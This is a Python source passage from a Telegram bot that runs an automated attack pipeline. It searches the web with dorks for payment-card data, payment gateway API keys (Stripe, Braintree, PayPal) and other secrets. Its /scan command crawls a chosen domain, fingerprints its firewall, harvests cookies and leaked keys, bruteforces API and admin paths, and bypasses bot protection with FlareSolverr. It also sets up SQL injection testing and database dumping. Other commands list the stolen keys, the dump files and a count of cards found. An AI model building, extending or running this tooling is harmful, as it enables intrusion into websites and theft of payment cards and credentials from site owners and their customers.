                text += f"  <code>{f.cookie_name}</code> = <code>{f.display_value}</code> [{f.source}]\n"
            text += "\n"
        
        if result.gateway_finds:
            text += f"🏦 <b>Gateway Cookies ({len(result.gateway_finds)}):</b>\n"
            for f in result.gateway_finds:
                text += f"  [{f.gateway.upper()}] <code>{f.cookie_name}</code> = <code>{f.display_value}</code>\n"
            text += "\n"
        
        if result.commerce_finds:
            text += f"🛒 <b>Commerce Cookies ({len(result.commerce_finds)}):</b>\n"
            for f in result.commerce_finds:
                text += f"  <code>{f.cookie_name}</code> = <code>{f.display_value}</code>\n"
            text += "\n"
        
        if result.detected_gateways:
            text += f"🔍 <b>Gateway SDKs in HTML:</b> {', '.join(g.upper() for g in result.detected_gateways)}\n"
        
        if result.checkout_pages:
            text += f"📡 <b>Checkout pages found:</b> {len(result.checkout_pages)}\n"
            for cp in result.checkout_pages[:5]:
                text += f"  → <code>{cp[:80]}</code>\n"
        
        if result.total_finds == 0 and not result.detected_gateways:
            text += "No B3, gateway, or commerce cookies found.\n"
        
        if result.error:
            text += f"\n⚠️ Error: {result.error}\n"
        
        if len(text) > 4000:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode="HTML")
        else:
            await update.message.reply_text(text, parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"❌ Cookie hunt error: {e}")


async def cmd_dorkstats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dorkstats command."""
    p = get_pipeline()
    gen_stats = p.generator.get_stats()
    
    text = (
        f"🔍 <b>Dork Generator Stats</b>\n"
        f"\n"
        f"<b>Patterns:</b> {gen_stats['patterns']}\n"
        f"<b>Static Dorks:</b> {gen_stats['static_dorks']}\n"
        f"\n"
        f"<b>Parameter Files:</b>\n"
    )
    for param, count in gen_stats["param_counts"].items():
        text += f"  {param}: {count} entries\n"
    
    text += (
        f"\n<b>Max Combinations:</b> {gen_stats['total_possible_combinations']:,}\n"
        f"<b>Categories:</b> {', '.join(gen_stats['categories'])}\n"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_sqlistats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sqlistats command — reads from DB (persists across restarts)."""
    p = get_pipeline()
    
    # Read from DB for persistence
    db_vulns = p.db.get_vulnerable_urls(limit=15) if hasattr(p, 'db') else []
    vuln_count = p.db.get_vuln_count() if hasattr(p, 'db') else len(p.vulnerable_urls)
    
    text = (
        f"🔓 <b>SQLi Statistics</b>\n"
        f"\n"
        f"<b>Total Vulns Found:</b> {vuln_count}\n"
        f"\n"
    )
    
    if db_vulns:
        # Count by type
        type_counts = {}
        for v in db_vulns:
            t = v.get('injection_type', v.get('type', 'unknown'))
            type_counts[t] = type_counts.get(t, 0) + 1
        text += "<b>By Type:</b> "
        text += " | ".join(f"{t}: {c}" for t, c in type_counts.items())
        text += "\n\n<b>Recent Vulnerabilities:</b>\n"
        for vuln in db_vulns[:10]:
            text += (
                f"\n<code>{vuln.get('url', '?')[:60]}</code>\n"
                f"  Param: {vuln.get('parameter', vuln.get('param', '?'))} | "
                f"Type: {vuln.get('injection_type', vuln.get('type', '?'))} | "
                f"DBMS: {vuln.get('dbms', '?')}\n"
            )
    else:
        text += "No SQLi vulnerabilities found yet."
    
    if len(text) > 4000:
        text = text[:3990] + "\n\n<i>... truncated</i>"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_secrets(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /secrets command — reads from DB (persists across restarts)."""
    p = get_pipeline()
    
    # Read from DB (persisted) not in-memory (lost on restart)
    db_gateways = p.db.get_gateway_keys(limit=20) if hasattr(p, 'db') else []
    db_secrets = p.db.get_secrets(limit=20) if hasattr(p, 'db') else []
    gw_count = p.db.get_gateway_count() if hasattr(p, 'db') else len(p.found_gateways)
    sec_count = p.db.get_secret_count() if hasattr(p, 'db') else len(p.found_secrets)
    
    text = f"🔐 <b>Found Secrets</b> ({gw_count} gateways, {sec_count} other)\n\n"
    
    if db_gateways:
        text += "<b>🔑 Gateway Keys:</b>\n"
        for gw in db_gateways[:15]:
            text += (
                f"  <b>{gw.get('key_type', gw.get('type', '?'))}</b>\n"
                f"  <code>{gw.get('key_value', gw.get('value', '?'))[:60]}</code>\n"
                f"  📍 {gw.get('url', '?')[:50]}\n\n"
            )
    
    if db_secrets:
        text += "\n<b>🔐 Other Secrets:</b>\n"
        for sec in db_secrets[:10]:
            text += (
                f"  <b>{sec.get('secret_type', sec.get('type', '?'))}</b>\n"
                f"  <code>{sec.get('value', '?')[:60]}</code>\n"
                f"  📍 {sec.get('url', '?')[:50]}\n\n"
            )
    
    if not db_gateways and not db_secrets:
        text += "No secrets found yet. Start pipeline with /dorkon"
    
    # Truncate for Telegram 4096 char limit
    if len(text) > 4000:
        text = text[:3990] + "\n\n<i>... truncated</i>"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_dumps(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /dumps command — reads from DB + filesystem."""
    p = get_pipeline()
    
    dump_dir = p.config.dumper_output_dir
    text = f"📦 <b>Data Dumps</b>\n\n"
    
    if os.path.exists(dump_dir):
        files = sorted(os.listdir(dump_dir), reverse=True)[:20]
        if files:
            total_size = 0
            for f in files:
                fpath = os.path.join(dump_dir, f)
                size = os.path.getsize(fpath)
                total_size += size
                text += f"📁 <code>{f}</code> ({size:,} bytes)\n"
            text += f"\n<b>Total:</b> {len(files)} files, {total_size:,} bytes\n"
        else:
            text += "No dumps yet.\n"
    else:
        text += "Dump directory not created yet.\n"
    
    # Card count from DB
    card_count = p.db.get_card_count() if hasattr(p, 'db') else len(p.found_cards)
    text += f"\n<b>💳 Cards Found:</b> {card_count}"
    
    # Vuln count for context
    vuln_count = p.db.get_vuln_count() if hasattr(p, 'db') else len(p.vulnerable_urls)
    text += f"\n<b>🔓 Injectable URLs:</b> {vuln_count}"
    
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /categories command."""
    text = (
        "🎯 <b>Available Categories</b>\n"
        "\n"
        "<b>Primary (Card/Gateway focus):</b>\n"
        "  💳 <code>cards</code> — Card numbers, CVVs, expiry dates\n"
        "  🔑 <code>gateways</code> — Stripe, Braintree, PayPal keys\n"
        "\n"
        "<b>Secondary:</b>\n"
        "  🔐 <code>secrets</code> — API keys, tokens, credentials\n"
        "  🔓 <code>sqli</code> — SQL injection targets\n"
        "  🗄️ <code>databases</code> — Exposed databases\n"
        "  ☁️ <code>cloud</code> — Cloud misconfigurations\n"
        "\n"
        "Use: /target &lt;category&gt;\n"
        "Example: /target cards"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def cmd_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /target <category> command."""
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text("Usage: /target <category>\nSee /categories for options.")
        return
    
    category = context.args[0].lower()
    valid = ["cards", "gateways", "secrets", "sqli", "databases", "cloud"]
    
    if category not in valid:
        await update.message.reply_text(f"Invalid category. Valid: {', '.join(valid)}")
        return
    
    await update.message.reply_text(f"🎯 Starting targeted scan for: <b>{category}</b>", parse_mode="HTML")
    
    # Run in background
    async def targeted_task():
        dorks = p.generator.generate_targeted(category, max_count=500)
        was_running = p.running
        if not was_running:
            p.running = True
            p.set_telegram_context(context.bot, update.effective_chat.id)
        await p.run_dork_cycle(dorks=dorks, category=category)
        if not was_running:
            p.running = False
    
    asyncio.create_task(targeted_task())


async def cmd_stopscan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stopscan command — cancel running scan/deepscan."""
    chat_id = update.effective_chat.id
    task = scan_tasks.get(chat_id)
    
    if task and not task.done():
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        scan_tasks.pop(chat_id, None)
        await update.message.reply_text("🛑 Scan cancelled.")
    else:
        await update.message.reply_text("No scan is currently running.")


async def cmd_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /scan <url> command — comprehensive deep scan. Runs as background task."""
    if not context.args:
        await update.message.reply_text("Usage: /scan <url>")
        return
    
    chat_id = update.effective_chat.id
    
    # Check if a scan is already running in this chat
    existing = scan_tasks.get(chat_id)
    if existing and not existing.done():
        await update.message.reply_text("⚠️ A scan is already running. Use /stopscan to cancel it first.")
        return
    
    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url
    
    await update.message.reply_text(
        f"🔍 <b>Full Domain Scan Starting</b>\n"
        f"<code>{url}</code>\n\n"
        f"Phase 1: WAF + Cookies + Platform Detection\n"
        f"Phase 2: Secret Extraction (all pages)\n"
        f"Phase 3: Deep Crawl (discover all internal pages)\n"
        f"Phase 4: SQLi Testing (URL + Cookie + Header + POST)\n"
        f"Phase 5: Data Dumping (if injectable)\n\n"
        f"Use /stopscan to cancel.",
        parse_mode="HTML"
    )
    
    # Run the actual scan as a background task
    async def _run_scan():
        try:
            await _do_scan(update, url)
        except asyncio.CancelledError:
            await update.message.reply_text("🛑 Scan cancelled.")
        except Exception as e:
            logger.error(f"Scan task error: {e}")
            await update.message.reply_text(f"❌ Scan error: {str(e)[:200]}")
        finally:
            scan_tasks.pop(chat_id, None)
    
    task = asyncio.create_task(_run_scan())
    scan_tasks[chat_id] = task


async def _do_scan(update: Update, url: str):
    """Comprehensive domain scanner — crawls the entire domain, scans everything."""
    p = get_pipeline()
    
    import aiohttp
    from urllib.parse import urlparse as _urlparse, urljoin, parse_qs, urlunparse
    from bs4 import BeautifulSoup
    
    parsed = _urlparse(url)
    base_domain = parsed.netloc
    base_url = f"{parsed.scheme}://{base_domain}"
    waf_result = None
    waf_name = None
    
    # Collect everything across all pages
    all_cookies = {}           # name -> {value, type}
    all_b3_cookies = {}        # name -> value
    all_cookie_domains = {}    # domain -> {name: value}
    all_secrets = []
    all_sqli_results = []
    all_dump_results = []
    all_endpoints = {}
    all_port_results = []      # open ports from port scanner
    platform_info = {}
    pages_scanned = 0
    pages_crawled = set()      # URLs we've already visited
    sqli_tested = 0
    discovered_param_urls = set()   # URLs with query params (SQLi targets)
    discovered_all_urls = set()     # All internal URLs
    
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(
        timeout=timeout,
        cookie_jar=aiohttp.CookieJar(unsafe=True),
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }
    ) as session:
        
        # ═══════ PHASE 1: WAF + Cookies + Tech Detection ═══════
        await update.message.reply_text("⏳ Phase 1: WAF Detection + Cookie Extraction...", parse_mode="HTML")
        
        if p.config.waf_detection_enabled:
            try:
                waf_info = await p.waf_detector.detect(url, session)
                waf_name = waf_info.waf
                waf_result = {
                    "name": waf_info.waf,
                    "cdn": waf_info.cdn,
                    "bot_protection": waf_info.bot_protection,
                    "risk": waf_info.risk_level,
                    "cms": waf_info.cms,
                }
            except Exception as e:
                logger.debug(f"WAF detection error: {e}")
        
        # Cookie extraction on main page
        if p.config.cookie_extraction_enabled:
            try:
                jar = await p.sqli_scanner.extract_cookies(url, session)
                if jar.cookies:
                    for name, value in jar.cookies.items():
                        all_cookies[name] = value
                        p.db.add_cookie(url, name, value, "auto")
                    for name, value in jar.b3_cookies.items():
                        all_b3_cookies[name] = value
                        p.db.add_b3_cookie(url, name, value)
                    all_cookie_domains[base_domain] = dict(jar.cookies)
            except Exception as e:
                logger.debug(f"Cookie extraction error: {e}")
        
        # Port scanning (v3.10) — parallel with Phase 1
        if p.port_scanner:
            try:
                port_result = await p.port_scanner.scan_and_report(url)
                if port_result and port_result.open_ports:
                    all_port_results = [
                        {"port": pp.port, "service": pp.service, "banner": pp.banner,
                         "version": pp.version, "risk": pp.risk}
                        for pp in port_result.open_ports
                    ]
            except Exception as e:
                logger.debug(f"Port scan error in cmd_scan: {e}")
        
        # ═══════ PHASE 2: Secret Extraction (deep — discovers pages + endpoints) ═══════
        await update.message.reply_text("⏳ Phase 2: Deep Secret Extraction + Endpoint Discovery...", parse_mode="HTML")
        
        try:
            scan_result = await p.secret_extractor.deep_extract_site(url, session)
            all_secrets = scan_result.get("secrets", [])
            platform_info = scan_result.get("platform", {})
            all_endpoints = scan_result.get("endpoints", {})
            sqli_candidates = scan_result.get("sqli_candidates", [])
            pages_scanned = scan_result.get("pages_scanned", 0)
        except Exception as e:
            logger.error(f"Secret extraction error: {e}")
            sqli_candidates = []
        
        # ═══════ PHASE 2.5: SPA Intelligence — JS Analysis + API Discovery ═══════
        # This phase handles modern SPA/SSR apps (Next.js, React, Vue, Angular)
        # where traditional crawling finds 0 forms, 0 params, 0 endpoints
        js_analysis_result = None
        api_brute_result = None
        spa_result = None
        detected_framework = ""
        
        await update.message.reply_text(
            "⏳ Phase 2.5: SPA Intelligence — JS Bundle Analysis + API Discovery...",
            parse_mode="HTML"
        )
        
        # Step A: JS Bundle Analysis — parse webpack/Next.js chunks for hidden endpoints
        try:
            js_analysis_result = await analyze_js_bundles(url)
            detected_framework = js_analysis_result.framework
            
            if js_analysis_result.api_endpoints or js_analysis_result.secrets or js_analysis_result.page_routes:
                spa_msg = (
                    f"🔬 <b>JS Bundle Analysis</b> ({js_analysis_result.js_files_analyzed} files, "
                    f"{js_analysis_result.total_js_bytes // 1024} KB)\n"
                )
                if detected_framework:
                    spa_msg += f"  Framework: <b>{detected_framework}</b>"
                    if js_analysis_result.build_tool:
                        spa_msg += f" ({js_analysis_result.build_tool})"
                    spa_msg += "\n"
                if js_analysis_result.api_endpoints:
                    spa_msg += f"  🎯 API Endpoints: <b>{len(js_analysis_result.api_endpoints)}</b>\n"
                    for ep in js_analysis_result.api_endpoints[:5]:
                        spa_msg += f"    {ep.method} <code>{ep.url[:80]}</code>"
                        if ep.auth_required:
                            spa_msg += " 🔒"
                        spa_msg += "\n"
                    if len(js_analysis_result.api_endpoints) > 5:
                        spa_msg += f"    ... +{len(js_analysis_result.api_endpoints) - 5} more\n"
                if js_analysis_result.secrets:
                    spa_msg += f"  🔑 Secrets in JS: <b>{len(js_analysis_result.secrets)}</b>\n"
                    for s in js_analysis_result.secrets[:3]:
                        spa_msg += f"    [{s.secret_type}] {s.value[:40]}...\n"
                if js_analysis_result.page_routes:
                    spa_msg += f"  📍 Routes: <b>{len(js_analysis_result.page_routes)}</b>\n"
                if js_analysis_result.graphql_endpoints:
                    spa_msg += f"  📊 GraphQL: {', '.join(js_analysis_result.graphql_endpoints[:3])}\n"
                if js_analysis_result.websocket_urls:
                    spa_msg += f"  🔌 WebSocket: {', '.join(js_analysis_result.websocket_urls[:3])}\n"
                if js_analysis_result.source_maps:
                    spa_msg += f"  📁 Source Maps: {len(js_analysis_result.source_maps)} found!\n"
                if js_analysis_result.env_vars:
                    spa_msg += f"  🌐 Env Vars: {len(js_analysis_result.env_vars)} leaked\n"
                
                await update.message.reply_text(spa_msg, parse_mode="HTML")
                
                # Add JS-discovered endpoints as scan targets
                for ep in js_analysis_result.api_endpoints:
                    ep_parsed = _urlparse(ep.url)
                    if ep_parsed.netloc == base_domain or not ep_parsed.netloc:
                        discovered_all_urls.add(ep.url)
                        if ep_parsed.query:
                            discovered_param_urls.add(ep.url)
                
                # Add JS-discovered secrets to our collection
                for s in js_analysis_result.secrets:
                    all_secrets.append(ExtractedSecret(
                        url=url,
                        type=s.secret_type,
                        category='js_bundle',
                        key_name=s.key_name,
                        value=s.value,
                        confidence=s.confidence,
                        context=s.source_file,
                    ))
                
                # Add page routes as URLs to crawl
                for route in js_analysis_result.page_routes:
                    if route.startswith("/"):
                        full_route = base_url + route
                        discovered_all_urls.add(full_route)
            else:
                await update.message.reply_text(
                    f"🔬 JS Analysis: {js_analysis_result.js_files_analyzed} files analyzed — "
                    f"no endpoints/secrets found in bundles",
                    parse_mode="HTML"
                )
        except Exception as e:
            logger.error(f"JS analysis error: {e}")
        
        # Step B: Playwright SPA Extraction — render page and intercept API calls
        try:
            if _HAS_PLAYWRIGHT:
                spa_result = await spa_extract(url, wait_seconds=4.0, scroll=True, intercept_api=True)
            else:
                spa_result = await spa_extract_with_flaresolverr(url)
            
            if spa_result and not spa_result.error:
                spa_found_something = (
                    spa_result.forms or spa_result.param_urls or
                    spa_result.api_calls or spa_result.internal_links
                )
                
                if spa_found_something:
                    spa_msg = "🌐 <b>SPA Rendering Results</b>\n"
                    if spa_result.framework:
                        spa_msg += f"  Framework: <b>{spa_result.framework}</b>\n"
                        detected_framework = detected_framework or spa_result.framework
                    if spa_result.forms:
                        spa_msg += f"  📝 Forms: <b>{len(spa_result.forms)}</b>\n"
                        for f in spa_result.forms[:3]:
                            spa_msg += f"    {f.get('method','GET')} {f.get('action','')[:60]} ({len(f.get('inputs',[]))} inputs)\n"
                    if spa_result.api_calls:
                        spa_msg += f"  📡 Intercepted API Calls: <b>{len(spa_result.api_calls)}</b>\n"
                        for ac in spa_result.api_calls[:5]:
                            spa_msg += f"    {ac.get('method','GET')} <code>{ac.get('url','')[:70]}</code>\n"
                        if len(spa_result.api_calls) > 5:
                            spa_msg += f"    ... +{len(spa_result.api_calls) - 5} more\n"
                    if spa_result.param_urls:
                        spa_msg += f"  🔗 Param URLs: <b>{len(spa_result.param_urls)}</b>\n"
                    if spa_result.internal_links:
                        spa_msg += f"  🔗 Internal Links: <b>{len(spa_result.internal_links)}</b>\n"
                    spa_msg += f"  🍪 Cookies: {len(spa_result.cookies)}\n"
                    
                    await update.message.reply_text(spa_msg, parse_mode="HTML")
                    
                    # Add SPA-discovered resources
                    for pu in spa_result.param_urls:
                        discovered_param_urls.add(pu)
                    for il in spa_result.internal_links:
                        discovered_all_urls.add(il)
                    for cname, cval in spa_result.cookies.items():
                        all_cookies[cname] = cval
                    
                    # Add intercepted API calls as targets
                    for ac in spa_result.api_calls:
                        ac_url = ac.get("url", "")
                        if ac_url:
                            ac_parsed = _urlparse(ac_url)
                            if ac_parsed.netloc == base_domain or not ac_parsed.netloc:
                                discovered_all_urls.add(ac_url)
                                if ac_parsed.query:
                                    discovered_param_urls.add(ac_url)
                else:
                    await update.message.reply_text(
                        "🌐 SPA rendering: no additional forms/links/API calls found in rendered DOM",
                        parse_mode="HTML"
                    )
        except Exception as e:
            logger.error(f"SPA extraction error: {e}")
        
        # Step C: API Endpoint Bruteforce — probe common paths
        try:
            # Build custom paths from JS analysis discoveries
            custom_paths = []
            if js_analysis_result and js_analysis_result.page_routes:
                for route in js_analysis_result.page_routes:
                    if route.startswith("/"):
                        custom_paths.append(route)
                        # Also try /api/ version of page routes
                        if not route.startswith("/api/"):
                            custom_paths.append(f"/api{route}")
            
            api_brute_result = await bruteforce_api(
                url=url,
                framework=detected_framework,
                custom_paths=custom_paths if custom_paths else None,
            )
            
            if api_brute_result.endpoints_found:
                bf_msg = (
                    f"🔨 <b>API Bruteforce Results</b> "
                    f"({api_brute_result.endpoints_probed} probed)\n"
                )
                if api_brute_result.open_endpoints:
                    bf_msg += f"  ✅ Open endpoints: <b>{len(api_brute_result.open_endpoints)}</b>\n"
                    for ep in api_brute_result.open_endpoints[:5]:
                        bf_msg += f"    {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
                        if ep.reason:
                            bf_msg += f"      → {ep.reason[:80]}\n"
                if api_brute_result.auth_endpoints:
                    bf_msg += f"  🔒 Auth-required: <b>{len(api_brute_result.auth_endpoints)}</b>\n"
                    for ep in api_brute_result.auth_endpoints[:5]:
                        bf_msg += f"    {ep.method} <code>{ep.url[:70]}</code> [{ep.status}]\n"
                if api_brute_result.graphql_introspection:
                    bf_msg += "  📊 <b>GraphQL introspection OPEN!</b>\n"
                
                # OpenAPI / Swagger spec discovery
                if api_brute_result.openapi_spec_url:
                    bf_msg += f"\n  📋 <b>OpenAPI Spec Found!</b>\n"
                    bf_msg += f"    <code>{api_brute_result.openapi_spec_url[:80]}</code>\n"
                    bf_msg += f"    Endpoints parsed: <b>{len(api_brute_result.openapi_endpoints)}</b>\n"
                    for oep in api_brute_result.openapi_endpoints[:10]:
                        params_str = ""
                        if oep.get("parameters"):
                            pnames = [p["name"] for p in oep["parameters"][:4]]
                            params_str = f" ({', '.join(pnames)})"
                        auth_icon = "🔒" if oep.get("auth_required") else "✅"
                        bf_msg += f"    {auth_icon} {oep['method']} <code>{oep['path'][:60]}</code>{params_str}\n"
                        if oep.get("summary"):
                            bf_msg += f"       → {oep['summary'][:60]}\n"
                    if len(api_brute_result.openapi_endpoints) > 10:
                        bf_msg += f"    ... +{len(api_brute_result.openapi_endpoints) - 10} more\n"

                # Admin panel discovery
                if getattr(api_brute_result, 'admin_panels', None):
                    bf_msg += f"\n  🔐 <b>Admin Panels Found: {len(api_brute_result.admin_panels)}</b>\n"
                    for ap in api_brute_result.admin_panels[:10]:
                        bf_msg += f"    {ap.reason}\n"
                        bf_msg += f"      <code>{ap.url[:80]}</code>\n"
                    if len(api_brute_result.admin_panels) > 10:
                        bf_msg += f"    ... +{len(api_brute_result.admin_panels) - 10} more\n"

                await update.message.reply_text(bf_msg, parse_mode="HTML")
                
                # Add discovered endpoints as scan targets
                for ep in api_brute_result.open_endpoints:
                    ep_parsed = _urlparse(ep.url)
                    discovered_all_urls.add(ep.url)
                    if ep_parsed.query:
                        discovered_param_urls.add(ep.url)
            else:
                await update.message.reply_text(
                    f"🔨 API Bruteforce: {api_brute_result.endpoints_probed} paths probed — none responsive",
                    parse_mode="HTML"
                )
        except Exception as e:
            logger.error(f"API bruteforce error: {e}")
        
        # ═══════ PHASE 3: Deep Crawl — find ALL internal pages ═══════
        # ═══════ PHASE 3: Deep Crawl — Firecrawl first, fall back to manual ═══════
        firecrawl_crawled = False
        if p.config.firecrawl_enabled and p.config.firecrawl_crawl_enabled and p._firecrawl_engine:
            await update.message.reply_text(
                f"⏳ Phase 3: Firecrawl Deep Crawl <code>{base_domain}</code>...\n"
                f"(JS rendering + sitemap + dedup built-in)",
                parse_mode="HTML"
            )
            try:
                # First, map all URLs (fast, no scraping)
                mapped_urls = await p._firecrawl_engine.map_urls(url, limit=500)
                if mapped_urls:
                    for mu in mapped_urls:
                        p_mu = _urlparse(mu)
                        if p_mu.netloc == base_domain:
                            discovered_all_urls.add(mu)
                            if p_mu.query:
                                discovered_param_urls.add(mu)
                    await update.message.reply_text(
                        f"🗺️ Firecrawl Map: <b>{len(mapped_urls)}</b> URLs discovered\n"
                        f"Param URLs: {len(discovered_param_urls)}",
                        parse_mode="HTML"
                    )

                # Then crawl for content (cookies, secrets in rendered JS)
                fc_pages = await p._firecrawl_engine.crawl(url, limit=p.config.firecrawl_crawl_limit)
                if fc_pages:
                    firecrawl_crawled = True
                    for page_data in fc_pages:
                        page_url = ""
                        pg_meta = page_data.get("metadata", {})
                        if isinstance(pg_meta, dict):
                            page_url = pg_meta.get("url", "") or pg_meta.get("source_url", "")
                        if not page_url:
                            page_url = page_data.get("url", "")
                        if page_url:
                            pages_crawled.add(page_url)
                            p_pu = _urlparse(page_url)
                            if p_pu.netloc == base_domain:
                                discovered_all_urls.add(page_url)
                                if p_pu.query:
                                    discovered_param_urls.add(page_url)
                        
                        # Extract links from FC results
                        fc_links = page_data.get("links", [])
                        if fc_links and isinstance(fc_links, list):
                            for fc_link in fc_links:
                                if isinstance(fc_link, str) and fc_link.startswith("http"):
                                    p_link = _urlparse(fc_link)
                                    if p_link.netloc == base_domain:
                                        discovered_all_urls.add(fc_link)
                                        if p_link.query:
                                            discovered_param_urls.add(fc_link)
                        
                        # Feed HTML to secret extractor for additional findings
                        html_content = page_data.get("html", "") or page_data.get("rawHtml", "")
                        if html_content and p.config.secret_extraction_enabled and page_url:
                            try:
                                page_secrets = p.secret_extractor.extract_from_text(
                                    html_content, page_url
                                )
                                if page_secrets:
                                    all_secrets.extend(page_secrets)
                            except Exception:
                                pass

                    total_pages_found = len(pages_crawled)
                    await update.message.reply_text(
                        f"✅ Firecrawl Crawl: <b>{len(fc_pages)}</b> pages scraped\n"
                        f"Total URLs discovered: {len(discovered_all_urls)}\n"
                        f"Param URLs: {len(discovered_param_urls)}",
                        parse_mode="HTML"
                    )

            except Exception as e:
                logger.error(f"Firecrawl crawl failed, falling back to manual: {e}")
                await update.message.reply_text(
                    f"⚠️ Firecrawl crawl failed: {str(e)[:100]}\nFalling back to manual crawl...",
                    parse_mode="HTML"
                )

        # Fall back to recursive crawler if Firecrawl didn't work (v3.9)
        if not firecrawl_crawled:
            # Add sqli_candidates from secret extractor as seeds
            extra_seeds = []
            for candidate in sqli_candidates:
                discovered_param_urls.add(candidate['url'])
                extra_seeds.append(candidate['url'])
            
            # Add endpoints from secret extractor as seeds
            for key, eps in all_endpoints.items():
                if isinstance(eps, list):
                    for ep in eps:
                        if isinstance(ep, str) and ep.startswith("http"):
                            if _urlparse(ep).netloc == base_domain:
                                extra_seeds.append(ep)
                                if "?" in ep:
                                    discovered_param_urls.add(ep)
            
            if p.crawler:
                await update.message.reply_text(
                    f"⏳ Phase 3: Recursive BFS Crawl <code>{base_domain}</code>...\n"
                    f"Depth: {p.config.deep_crawl_max_depth} | Max pages: {p.config.deep_crawl_max_pages}\n"
                    f"Seeds: {1 + len(extra_seeds)} | Already found {pages_scanned} pages",
                    parse_mode="HTML"
                )
                
                progress_counter = [0]
                
                async def _scan_on_page(page):
                    """Process each crawled page in real-time."""
                    progress_counter[0] += 1
                    pages_crawled.add(page.url)
                    
                    # Cookies
                    if p.config.cookie_extraction_enabled:
                        for cname, cval in page.cookies.items():
                            if cname not in all_cookies:
                                all_cookies[cname] = cval
                                p.db.add_cookie(page.url, cname, cval, "crawl")
                                b3_names = {"x-b3-traceid", "x-b3-spanid", "x-b3-parentspanid",
                                           "x-b3-sampled", "x-b3-flags", "b3"}
                                if cname.lower() in b3_names:
                                    all_b3_cookies[cname] = cval
                                    p.db.add_b3_cookie(page.url, cname, cval)
                    
                    # Secrets
                    if page.html and p.config.secret_extraction_enabled:
                        try:
                            page_secrets = p.secret_extractor.extract_from_text(
                                page.html, page.url
                            )
                            if page_secrets:
                                all_secrets.extend(page_secrets)
                        except Exception:
                            pass
                    
                    # Progress every 25 pages
                    if progress_counter[0] % 25 == 0:
                        await update.message.reply_text(
                            f"🕸️ Crawled {progress_counter[0]} pages | "
                            f"Cookies: {len(all_cookies)} | "
                            f"Secrets: {len(all_secrets)}",
                            parse_mode="HTML"
                        )
                
                try:
                    crawl_result = await p.crawler.crawl(
                        url,
                        session=session,
                        max_depth=p.config.deep_crawl_max_depth,
                        max_pages=p.config.deep_crawl_max_pages,
                        on_page=_scan_on_page,
                        extra_seeds=extra_seeds,
                    )
                    
                    # ── FlareSolverr fallback: if aiohttp got very few pages ──
                    if crawl_result.total_fetched <= 2:
                        await update.message.reply_text(
                            f"🌐 aiohttp only got <b>{crawl_result.total_fetched}</b> pages — "
                            f"falling back to FlareSolverr crawl...",
                            parse_mode="HTML"
                        )
                        try:
                            flare_result = await flaresolverr_crawl(
                                seed_url=url,
                                max_pages=p.config.deep_crawl_max_pages,
                                max_depth=p.config.deep_crawl_max_depth,
                            )
                            if flare_result.total_fetched > crawl_result.total_fetched:
                                # Run secret extraction on FlareSolverr-crawled pages
                                for bp in flare_result.html_pages:
                                    if bp.html and p.config.secret_extraction_enabled:
                                        try:
                                            page_secs = p.secret_extractor.extract_from_text(
                                                bp.html, bp.url,
                                            )
                                            if page_secs:
                                                all_secrets.extend(page_secs)
                                        except Exception:
                                            pass
                                    # Collect cookies
                                    for cname, cval in bp.cookies.items():
                                        all_cookies[cname] = cval
                                    pages_crawled.add(bp.url)

                                await update.message.reply_text(
                                    f"🌐 FlareSolverr got <b>{flare_result.total_fetched}</b> pages "
                                    f"(vs aiohttp {crawl_result.total_fetched})",
                                    parse_mode="HTML"
                                )
                                crawl_result = flare_result
                            else:
                                await update.message.reply_text(
                                    "🌐 FlareSolverr didn't improve results, keeping aiohttp data",
                                    parse_mode="HTML"
                                )
                        except Exception as e:
                            logger.warning(f"[FlareFallback] FlareSolverr crawl failed: {e}")
                            await update.message.reply_text(
                                f"⚠️ FlareSolverr fallback error: {str(e)[:200]}",
                                parse_mode="HTML"
                            )
                    
                    discovered_all_urls.update(crawl_result.all_urls)
                    discovered_param_urls.update(crawl_result.param_urls)
                    
                    await update.message.reply_text(
                        f"✅ Recursive crawl complete:\n"
                        f"  Pages: <b>{crawl_result.total_fetched}</b>\n"
                        f"  Max depth: <b>{crawl_result.max_depth_reached}</b>\n"
                        f"  URLs discovered: <b>{len(crawl_result.all_urls)}</b>\n"
                        f"  Param URLs: <b>{len(crawl_result.param_urls)}</b>\n"
                        f"  Forms: <b>{len(crawl_result.form_targets)}</b>\n"
                        f"  Cookies: <b>{len(crawl_result.all_cookies)}</b>\n"
                        f"  B3 cookies: <b>{len(crawl_result.b3_cookies)}</b>\n"
                        f"  Elapsed: {crawl_result.elapsed:.1f}s",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Recursive crawl failed: {e}")
                    await update.message.reply_text(
                        f"⚠️ Recursive crawl error: {str(e)[:200]}",
                        parse_mode="HTML"
                    )
            else:
                await update.message.reply_text(
                    "⚠️ Recursive crawler not enabled. Set deep_crawl_enabled=True.",
                    parse_mode="HTML"
                )
        
        total_pages_found = len(pages_crawled)
        
        await update.message.reply_text(
            f"✅ Crawl complete: <b>{total_pages_found}</b> pages | "
            f"<b>{len(discovered_param_urls)}</b> param URLs | "
            f"<b>{len(all_cookies)}</b> cookies",
            parse_mode="HTML"
        )
        
        # ═══════ PHASE 4: SQLi Testing — all param URLs + cookies + headers + POST ═══════
        # Merge discovered param URLs with sqli_candidates
        all_sqli_targets = set()
